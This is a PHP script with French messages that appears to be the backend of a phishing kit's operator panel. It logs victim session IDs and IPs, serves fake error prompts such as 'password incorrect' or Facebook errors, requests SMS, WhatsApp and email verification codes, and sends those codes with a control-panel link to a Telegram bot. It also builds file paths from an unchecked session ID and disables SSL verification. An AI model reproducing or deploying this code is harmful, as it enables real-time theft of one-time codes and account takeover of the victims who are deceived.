<?php
// Récupérer les données JSON envoyées
$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

// Vérifier si les données sont valides
if (!$data || !isset($data['session']) || !isset($data['ip']) || !isset($data['action'])) {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'Données invalides']);
    exit;
}

// Récupérer les données
$sessionId = $data['session'];
$clientIp = $data['ip'];
$action = $data['action'];

// Créer le dossier sessions s'il n'existe pas
if (!file_exists('sessions')) {
    mkdir('sessions', 0777, true);
}

// Préparer les données de l'action
$actionData = [
    'action' => $action,
    'timestamp' => time()
];

// Traitement spécifique selon le type d'action
switch ($action) {
    case 'sms_verification':
        // Générer un code SMS aléatoire si non fourni
        if (!isset($data['smsCode'])) {
            $actionData['smsCode'] = sprintf("%06d", mt_rand(100000, 999999));
        } else {
            $actionData['smsCode'] = $data['smsCode'];
        }
        break;
        
    case 'whatsapp_verification':
        // Générer un code WhatsApp aléatoire si non fourni
        if (!isset($data['whatsappCode'])) {
            $actionData['whatsappCode'] = sprintf("%06d", mt_rand(100000, 999999));
        } else {
            $actionData['whatsappCode'] = $data['whatsappCode'];
        }
        break;
        
    case 'email_verification':
        // Générer un code Email aléatoire si non fourni
        if (!isset($data['emailCode'])) {
            $actionData['emailCode'] = sprintf("%06d", mt_rand(100000, 999999));
        } else {
            $actionData['emailCode'] = $data['emailCode'];
        }
        break;
        
    case 'sms_error':
        $actionData['errorMessage'] = $data['errorMessage'] ?? 'Le code SMS que vous avez entré est incorrect. Veuillez réessayer.';
        break;
        
    case 'whatsapp_error':
        $actionData['errorMessage'] = $data['errorMessage'] ?? 'Le code WhatsApp que vous avez entré est incorrect. Veuillez réessayer.';
        break;
        
    case 'email_error':
        $actionData['errorMessage'] = $data['errorMessage'] ?? 'Le code Email que vous avez entré est incorrect. Veuillez réessayer.';
        break;
        
    case 'device_authorized':
        $actionData['errorMessage'] = $data['errorMessage'] ?? 'Les informations que vous avez saisies sont incorrectes. Veuillez réessayer.';
        break;
        
        case 'facebook_error':
            $actionData['errorMessage'] = $data['errorMessage'] ?? 'Les informations que vous avez saisies sont incorrectes. Veuillez réessayer.';
            break;
            
    case 'password_incorrect':
        $actionData['errorMessage'] = $data['errorMessage'] ?? 'Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.';
        break;
        
    case 'technical_error':
        $actionData['errorMessage'] = $data['errorMessage'] ?? 'Une erreur technique est survenue. Veuillez réessayer ultérieurement.';
        break;
        
    case 'redirect':
        if (isset($data['redirect'])) {
            $actionData['redirect'] = $data['redirect'];
        }
        break;
        
    default:
        // Pour les autres actions, ajouter les données supplémentaires si elles existent
        if (isset($data['smsCode'])) {
            $actionData['smsCode'] = $data['smsCode'];
        }

        if (isset($data['whatsappCode'])) {
            $actionData['whatsappCode'] = $data['whatsappCode'];
        }
        
        if (isset($data['emailCode'])) {
            $actionData['emailCode'] = $data['emailCode'];
        }
        
        if (isset($data['errorMessage'])) {
            $actionData['errorMessage'] = $data['errorMessage'];
        }
        
        if (isset($data['redirect'])) {
            $actionData['redirect'] = $data['redirect'];
        }
        break;
}

// Enregistrer l'action
$actionFile = 'sessions/' . $sessionId . '_action.json';
file_put_contents($actionFile, json_encode($actionData));

// Préparer le message Telegram
$message = "🔔 NOUVELLE ACTION 🔔\n\n";
$message .= "⚡ Action: " . $action . "\n";
$message .= "🔑 Session ID: " . $sessionId . "\n";
$message .= "🌐 IP: " . $clientIp . "\n\n";

if (isset($actionData['smsCode'])) {
    $message .= "📱 Code SMS: <code>" . $actionData['smsCode'] . "</code>\n";
}

if (isset($actionData['whatsappCode'])) {
    $message .= "💬 Code WhatsApp: <code>" . $actionData['whatsappCode'] . "</code>\n";
}

if (isset($actionData['emailCode'])) {
    $message .= "📧 Code Email: <code>" . $actionData['emailCode'] . "</code>\n";
}

if (isset($actionData['errorMessage'])) {
    $message .= "❌ Message d'erreur: <code>" . $actionData['errorMessage'] . "</code>\n";
}

if (isset($actionData['redirect'])) {
    $message .= "🔄 Redirection vers: <code>" . $actionData['redirect'] . "</code>\n";
}


// Envoyer la notification à Telegram
$telegramConfigFile = 'telegram_config.json';
if (file_exists($telegramConfigFile) &&  (isset($actionData['whatsappCode']) ||   isset($actionData['smsCode']) ||   isset($actionData['emailCode']) )) {
    $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
  
    $botToken = $telegramConfig['bot_token'] ?? '';
    $chatId = $telegramConfig['chat_id'] ?? '';

    $message .= "\n🔗 Panneau de contrôle: " . (isset($telegramConfig['url']) ? $telegramConfig['url'] : 'localhost') . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;

    
    if (!empty($botToken) && !empty($chatId)) {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $params = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // Skip SSL Verification
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
    }
}

// Renvoyer une réponse de succès
header('Content-Type: application/json');
echo json_encode(['success' => true]);